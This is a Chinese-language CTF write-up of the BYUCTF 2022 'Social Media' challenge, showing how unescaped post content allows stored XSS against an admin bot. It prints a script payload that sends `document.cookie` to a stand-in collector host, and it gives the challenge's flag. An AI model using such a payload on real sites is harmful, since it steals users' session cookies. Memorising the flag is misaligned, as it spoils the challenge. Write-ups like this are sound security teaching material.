# BYUCTF 2022 - Social Media

## 题目简述

应用允许创建帖子和评论，并提供管理员机器人访问投稿链接。管理员的 flag 存在浏览器 cookie 中；目标是利用持久化 XSS 把该 cookie 外带到自己的接收端。

## 解题过程

源码直接把 `post["content"]` 和评论字符串拼入 HTML，没有转义或净化：

```python
index += '<div class="post">' + post['content'] + '</div>'
```

同时 Flask 配置显式设置 `SESSION_COOKIE_HTTPONLY = False`；更直接的是，管理员 bot 写入名为 `flag` 的 cookie 时没有设置 `httpOnly`，所以页面 JavaScript 可以读取它。创建包含以下等价载荷的帖子：

```html
<script>
new Image().src =
  'https://collector.example/leak?cookie=' +
  encodeURIComponent(document.cookie);
</script>
```

创建后记录 `/getpost?id=<postID>` 链接并提交给管理员 bot。该路由按十六进制 `postID` 取帖，不要求与当前会话相同；bot 打开页面时执行持久化脚本，接收端请求参数中出现：

```text
flag=byuctf{xss_1s_a_v3ry_common_m3thod_of_attack!}
```

## 方法总结

利用链需要三个条件同时成立：不转义的持久化内容、管理员会访问可分享链接、flag cookie 对脚本可读。源码中还有字符串拼接 SQL，但本题获取管理员 cookie 的决定性原语是存储型 XSS。
